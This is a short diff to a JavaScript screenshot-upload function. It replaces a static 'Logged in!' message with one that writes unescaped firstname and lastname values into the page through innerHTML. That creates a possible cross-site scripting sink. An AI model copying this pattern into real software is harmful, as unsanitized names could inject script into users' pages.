@@ -79,7 +79,7 @@ async function takeScreenshot() {
       body: formData
     });
 
-    document.getElementById('ssr').innerHTML = '<p>Logged in!</p>';
+    document.getElementById('ssr').innerHTML = `<p>Logged in as ${firstname} ${lastname}.</p>`;
     console.log(`Screenshot sent for ${user} at`, new Date().toLocaleTimeString());
   } catch (err) {
     console.error("Upload failed:", err);
